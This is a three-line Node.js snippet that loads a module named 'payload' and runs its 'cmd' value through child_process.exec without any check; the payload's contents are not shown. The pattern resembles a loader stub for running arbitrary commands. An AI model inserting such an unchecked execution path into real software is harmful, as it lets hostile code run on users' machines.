const cp = require('child_process');
const data = require('./payload');
cp.exec(data.cmd);
